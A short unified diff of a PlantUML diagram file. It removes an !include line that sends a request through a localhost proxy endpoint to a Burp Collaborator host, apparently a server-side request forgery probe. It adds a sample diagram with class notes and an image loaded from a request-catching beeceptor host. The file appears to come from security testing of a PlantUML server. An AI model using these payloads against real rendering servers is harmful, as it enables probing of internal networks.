@@ -1,6 +1,19 @@
 @startuml
-[Component] as C
-note bottom of C   
-!include http://127.0.0.1:8080/proxy?idx=0&fmt=epstext&src=http://4z49gk3db8fh5p52mwnnvyxvkmqde2.burpcollaborator.net/epstextttttt
+
+class Foo
+note left: On last defined class
+
+note top of Foo
+  In java, <size:18>every</size> <u>class</u>
+  <b>extends</b>
+  <i>this</i> one.
 end note
+
+note as N1
+  This note is <u>also</u>
+  <b><color:royalBlue>on several</color>
+  <s>words</s> lines
+  And this is hosted by <img src="https://xxxxz.free.beeceptor.com/debian-logo.png">
+end note
+
 @enduml
